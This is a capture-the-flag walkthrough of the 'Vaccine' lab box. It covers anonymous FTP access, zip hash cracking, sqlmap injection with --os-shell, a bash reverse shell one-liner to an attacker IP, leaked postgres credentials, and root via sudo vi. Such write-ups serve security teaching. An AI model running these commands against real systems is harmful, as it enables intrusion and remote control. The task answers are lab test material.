# Vaccine
<img width="300" height="300" alt="image" src="https://github.com/user-attachments/assets/3de4c6b2-e820-4e87-ba27-eee378bc136d" />

---
### Task 1
Besides SSH and HTTP, what other service is hosted on this box?

Ans : FTP

<img width="521" height="167" alt="image" src="https://github.com/user-attachments/assets/c651e003-f801-4fdd-86a3-be4352f173b9" />

---
### Task 2
This service can be configured to allow login with any password for specific username. What is that username?

Ans : anonymous

<img width="342" height="187" alt="image" src="https://github.com/user-attachments/assets/cc612f43-a8ce-4cac-82d0-7811a2b1404d" />

---
### Task 3
What is the name of the file downloaded over this service?

Ans : backup.zip

<img width="757" height="427" alt="image" src="https://github.com/user-attachments/assets/e4c25a6a-2c85-4588-9dff-e3bd0ab45399" />

---
### Task 4
What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

Ans : zip2john

<img width="760" height="197" alt="image" src="https://github.com/user-attachments/assets/a7b24167-a793-4c3a-99db-0403a2b4f8ee" />

---
### Task 5
What is the password for the admin user on the website?

Ans : qwerty789

<img width="556" height="171" alt="image" src="https://github.com/user-attachments/assets/e606864d-4d5b-486c-a3a4-4c3388c87093" />

<img width="842" height="466" alt="image" src="https://github.com/user-attachments/assets/906d492c-d5f0-4243-8653-52c8b2a03e48" />

<img width="732" height="492" alt="image" src="https://github.com/user-attachments/assets/6e957754-f6b9-4870-affb-80c9e01fdc75" />

---
### Task 6
What option can be passed to sqlmap to try to get command execution via the sql injection?

Ans : --os-shell

<img width="757" height="316" alt="image" src="https://github.com/user-attachments/assets/5cac790f-2c70-4077-a64d-096be361c25f" />

<img width="842" height="396" alt="image" src="https://github.com/user-attachments/assets/eae825c2-0ae5-41fc-b866-8b70304e7bf9" />

```
sqlmap -u "http://10.129.52.180/dashboard.php?search=input" --cookie="PHPSESSID=ip11u6hoccb9qip3q7q7naj6ud" --batch --dbs 
```

<img width="837" height="517" alt="image" src="https://github.com/user-attachments/assets/906fadba-4d73-4acf-b4d3-4fedb6b5af65" />

```
sqlmap -u "http://10.129.52.180/dashboard.php?search=input" --cookie="PHPSESSID=ip11u6hoccb9qip3q7q7naj6ud" --batch --os-shell 
```
<img width="667" height="322" alt="image" src="https://github.com/user-attachments/assets/6b25e965-470c-4367-ad99-18e7762b728c" />

to stabalize the shell

```
bash -c 'bash -i >& /dev/tcp/10.10.14.246/4444 0>&1'
```

<img width="532" height="342" alt="image" src="https://github.com/user-attachments/assets/955f3571-64e7-44fc-ab17-8661780ff23e" />

<img width="755" height="242" alt="image" src="https://github.com/user-attachments/assets/a00f31e4-9d9c-4d5e-9024-90cb629b9e7e" />

user=postgres

password=P@s5w0rd!

<img width="595" height="582" alt="image" src="https://github.com/user-attachments/assets/d7683759-dc82-4842-b55e-01e1e7da3048" />


---
### Task 7
What program can the postgres user run as root using sudo?

Ans : vi

<img width="766" height="126" alt="image" src="https://github.com/user-attachments/assets/e5291de6-0340-4250-97e9-fcb794ad73ee" />

---
### User Flag
Submit the flag located in the postgres user's home directory.

<img width="595" height="582" alt="image" src="https://github.com/user-attachments/assets/d7683759-dc82-4842-b55e-01e1e7da3048" />

---
### Root Flag
Submit the flag located in root's home directory.

<img width="752" height="502" alt="image" src="https://github.com/user-attachments/assets/2db5e1be-13e9-4b41-a702-a24169780feb" />

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

```
<img width="537" height="192" alt="image" src="https://github.com/user-attachments/assets/a25428d8-f44f-49ea-8ee1-9f7db3568b81" />

                                                


<img width="312" height="52" alt="image" src="https://github.com/user-attachments/assets/a896b3fb-6223-4a1d-b4fe-aa3323bb1d90" />




<img width="317" height="77" alt="image" src="https://github.com/user-attachments/assets/f18aa4ec-260b-4992-8bdf-bab1a6ae29b2" />

---

<img width="722" height="332" alt="image" src="https://github.com/user-attachments/assets/c80b740e-68e7-4df1-8bf1-682e14ceb644" />

---

Thank You !!!


